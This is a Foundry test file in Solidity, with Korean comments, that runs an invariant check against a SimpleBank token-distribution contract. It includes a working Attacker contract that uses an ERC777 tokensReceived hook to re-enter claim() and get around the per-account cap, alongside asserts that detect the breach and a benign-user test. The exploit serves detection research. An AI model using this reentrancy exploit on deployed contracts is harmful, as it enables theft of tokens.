// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
import "../src/SimpleBank.sol";

/*
  STEP 3 — invariant 검증 (실제 EVM)

  이 파일이 증명하려는 것:

    "밸리데이터는 '이게 취약점인가'를 판단하지 않는다.
     invariant 를 assert 로 심고 실행만 했는데, 마이너의 공격이 그것을 깼다."

  구조:
    InvariantChecker  = 밸리데이터. assert 만 실행한다. 판단 로직이 없다.
    Attacker          = 마이너. ERC777 훅으로 claim() 을 재진입한다.
    BenignUser        = 정상 사용자. 오탐(FP) 확인용.

  실행:
    forge test --match-contract InvariantCheckTest -vv

  기대 결과: 3개 테스트 모두 [PASS]
    testExploitSucceedsWithoutInvariant — assert 가 없으면 공격이 조용히 성공한다
    testInvariantCatchesExploit         — invariant 를 심으면 공격이 그것을 깬다 (탐지 성공)
    testInvariantAllowsBenign           — 정상 거래에서는 깨지지 않는다 (FP 0)
*/

// ─────────────────────────────────────────────────────────────────────────────
// 밸리데이터 — 판단하지 않고 assert 만 실행한다.
// 아래 두 함수의 본문은 generate_invariants.mjs 가 STEP 2 에서 뽑아낸
// solidity_assert 문자열을 그대로 심는 자리다.
// ─────────────────────────────────────────────────────────────────────────────
contract InvariantChecker {
    SimpleBank public bank;
    ERC777 public token;

    constructor(SimpleBank _bank, ERC777 _token) {
        bank = _bank;
        token = _token;
    }

    /// INV-1 [money_flow/PerAccountUpperBound]
    /// 계정별 누적 배분량은 트랜잭션 종료 시점에도 상한을 넘을 수 없다.
    function checkPerAccountUpperBound(address account) external view {
        assert(bank._mints(account) <= bank.maxMints());
    }

    /// INV-2 [money_flow/AccountingConservation]
    /// 실제로 받아간 토큰 잔액도 같은 상한을 넘을 수 없다.
    function checkBalanceUpperBound(address account) external view {
        assert(token.balanceOf(account) <= bank.maxMints());
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 마이너 — 공격 PoC 를 탐색해서 실행한다.
// ─────────────────────────────────────────────────────────────────────────────
contract Attacker {
    SimpleBank public bank;
    ERC777 public token;
    bool public reentered;

    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH =
        keccak256("ERC777TokensRecipient");

    constructor(SimpleBank _bank, ERC777 _token) {
        bank = _bank;
        token = _token;
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24)
            .setInterfaceImplementer(
                address(this),
                _TOKENS_RECIPIENT_INTERFACE_HASH,
                address(this)
            );
    }

    function attack() external {
        // 계정당 상한은 1,000. 900 을 요청한다.
        bank.claim(address(this), 900);
    }

    // ERC777 transfer 도중 호출된다 — 이 시점에 bank._mints[this] 는 아직 0이다.
    function tokensReceived(
        address,
        address,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external {
        if (!reentered && token.balanceOf(address(this)) <= 1000) {
            reentered = true;
            bank.claim(address(this), 1000); // 재진입 — require 를 다시 통과한다
        }
    }

    receive() external payable {}
}

// ─────────────────────────────────────────────────────────────────────────────
// 정상 사용자 — 훅에서 아무것도 하지 않는다.
// ─────────────────────────────────────────────────────────────────────────────
contract BenignUser {
    SimpleBank public bank;
    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH =
        keccak256("ERC777TokensRecipient");

    constructor(SimpleBank _bank) {
        bank = _bank;
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24)
            .setInterfaceImplementer(
                address(this),
                _TOKENS_RECIPIENT_INTERFACE_HASH,
                address(this)
            );
    }

    function claim(uint256 amount) external {
        bank.claim(address(this), amount);
    }

    function tokensReceived(
        address,
        address,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external {}

    receive() external payable {}
}

contract MyERC777 is ERC777 {
    constructor() ERC777("Gold", "GLD", new address[](0)) {}

    function mint(address account, uint256 amount) public returns (bool) {
        _mint(account, amount, "", "");
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
contract InvariantCheckTest is Test {
    MyERC777 token;
    SimpleBank bank;
    InvariantChecker checker;

    function setUp() public {
        // ERC-1820 레지스트리는 고정 주소에 배포된 표준 컨트랙트다. 로컬에 mock 으로 심는다.
        vm.etch(
            address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24),
            hex"608060405234801561001057600080fd5b50600436106100a5576000357c010000000000000000000000000000000000000000000000000000000090048063a41e7d5111610078578063a41e7d51146101d4578063aabbb8ca1461020a578063b705676514610236578063f712f3e814610280576100a5565b806329965a1d146100aa5780633d584063146100e25780635df8122f1461012457806365ba36c114610152575b600080fd5b6100e0600480360360608110156100c057600080fd5b50600160a060020a038135811691602081013591604090910135166102b6565b005b610108600480360360208110156100f857600080fd5b5035600160a060020a0316610570565b60408051600160a060020a039092168252519081900360200190f35b6100e06004803603604081101561013a57600080fd5b50600160a060020a03813581169160200135166105bc565b6101c26004803603602081101561016857600080fd5b81019060208101813564010000000081111561018357600080fd5b82018360208201111561019557600080fd5b803590602001918460018302840111640100000000831117156101b757600080fd5b5090925090506106b3565b60408051918252519081900360200190f35b6100e0600480360360408110156101ea57600080fd5b508035600160a060020a03169060200135600160e060020a0319166106ee565b6101086004803603604081101561022057600080fd5b50600160a060020a038135169060200135610778565b61026c6004803603604081101561024c57600080fd5b508035600160a060020a03169060200135600160e060020a0319166107ef565b604080519115158252519081900360200190f35b61026c6004803603604081101561029657600080fd5b508035600160a060020a03169060200135600160e060020a0319166108aa565b6000600160a060020a038416156102cd57836102cf565b335b9050336102db82610570565b600160a060020a031614610339576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b6103428361092a565b15610397576040805160e560020a62461bcd02815260206004820152601a60248201527f4d757374206e6f7420626520616e204552433136352068617368000000000000604482015290519081900360640190fd5b600160a060020a038216158015906103b85750600160a060020a0382163314155b156104ff5760405160200180807f455243313832305f4143434550545f4d4147494300000000000000000000000081525060140190506040516020818303038152906040528051906020012082600160a060020a031663249cb3fa85846040518363ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018083815260200182600160a060020a0316600160a060020a031681526020019250505060206040518083038186803b15801561047e57600080fd5b505afa158015610492573d6000803e3d6000fd5b505050506040513d60208110156104a857600080fd5b5051146104ff576040805160e560020a62461bcd02815260206004820181905260248201527f446f6573206e6f7420696d706c656d656e742074686520696e74657266616365604482015290519081900360640190fd5b600160a060020a03818116600081815260208181526040808320888452909152808220805473ffffffffffffffffffffffffffffffffffffffff19169487169485179055518692917f93baa6efbd2244243bfee6ce4cfdd1d04fc4c0e9a786abd3a41313bd352db15391a450505050565b600160a060020a03818116600090815260016020526040812054909116151561059a5750806105b7565b50600160a060020a03808216600090815260016020526040902054165b919050565b336105c683610570565b600160a060020a031614610624576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b81600160a060020a031681600160a060020a0316146106435780610646565b60005b600160a060020a03838116600081815260016020526040808220805473ffffffffffffffffffffffffffffffffffffffff19169585169590951790945592519184169290917f605c2dbf762e5f7d60a546d42e7205dcb1b011ebc62a61736a57c9089d3a43509190a35050565b600082826040516020018083838082843780830192505050925050506040516020818303038152906040528051906020012090505b92915050565b6106f882826107ef565b610703576000610705565b815b600160a060020a03928316600081815260208181526040808320600160e060020a031996909616808452958252808320805473ffffffffffffffffffffffffffffffffffffffff19169590971694909417909555908152600284528181209281529190925220805460ff19166001179055565b600080600160a060020a038416156107905783610792565b335b905061079d8361092a565b156107c357826107ad82826108aa565b6107b85760006107ba565b815b925050506106e8565b600160a060020a0390811660009081526020818152604080832086845290915290205416905092915050565b6000808061081d857f01ffc9a70000000000000000000000000000000000000000000000000000000061094c565b909250905081158061082d575080155b1561083d576000925050506106e8565b61084f85600160e060020a031961094c565b909250905081158061086057508015155b15610870576000925050506106e8565b61087a858561094c565b909250905060018214801561088f5750806001145b1561089f576001925050506106e8565b506000949350505050565b600160a060020a0382166000908152600260209081526040808320600160e060020a03198516845290915281205460ff1615156108f2576108eb83836107ef565b90506106e8565b50600160a060020a03808316600081815260208181526040808320600160e060020a0319871684529091529020549091161492915050565b7bffffffffffffffffffffffffffffffffffffffffffffffffffffffff161590565b6040517f01ffc9a7000000000000000000000000000000000000000000000000000000008082526004820183905260009182919060208160248189617530fa90519096909550935050505056fea165627a7a72305820377f4a2d4301ede9949f163f319021a6e9c687c292a5e2b2c4734c126b524e6c0029"
        );

        token = new MyERC777();
        bank = new SimpleBank(address(token));
        token.mint(address(bank), 10_000);
        checker = new InvariantChecker(bank, ERC777(address(token)));
    }

    /// invariant 가 없으면 공격은 아무 에러 없이 성공한다.
    /// 이것이 "밸리데이터가 판단해야 한다면 못 잡는다"의 실체다.
    function testExploitSucceedsWithoutInvariant() public {
        Attacker attacker = new Attacker(bank, ERC777(address(token)));
        attacker.attack(); // revert 없음

        uint256 balance = token.balanceOf(address(attacker));
        uint256 accounted = bank._mints(address(attacker));
        console.log("attacker balance :", balance);   // 1900
        console.log("bank._mints      :", accounted); // 1900
        console.log("maxMintsPerAddr  :", bank.maxMints()); // 1000

        assertEq(balance, 1900, "reentrancy 로 상한 1000 을 우회");
        assertGt(balance, bank.maxMints());
    }

    /// invariant 를 assert 로 심으면, 밸리데이터는 판단 없이 실행만 해도 공격을 탐지한다.
    function testInvariantCatchesExploit() public {
        Attacker attacker = new Attacker(bank, ERC777(address(token)));
        attacker.attack();

        // assert(false) 는 Panic(0x01) 로 revert 한다 = invariant 가 깨졌다.
        vm.expectRevert(stdError.assertionError);
        checker.checkPerAccountUpperBound(address(attacker));

        vm.expectRevert(stdError.assertionError);
        checker.checkBalanceUpperBound(address(attacker));
    }

    /// 정상 거래에서는 같은 invariant 가 깨지지 않는다 (false positive 0).
    function testInvariantAllowsBenign() public {
        BenignUser user = new BenignUser(bank);

        user.claim(900);
        checker.checkPerAccountUpperBound(address(user));
        checker.checkBalanceUpperBound(address(user));

        user.claim(100); // 누적 1000 = 상한 정확히 도달
        checker.checkPerAccountUpperBound(address(user));
        checker.checkBalanceUpperBound(address(user));

        assertEq(bank._mints(address(user)), 1000);

        // 상한을 넘기려는 정상 호출은 require 가 먼저 막는다.
        vm.expectRevert("Exceeds max mints per address");
        user.claim(1);
    }
}
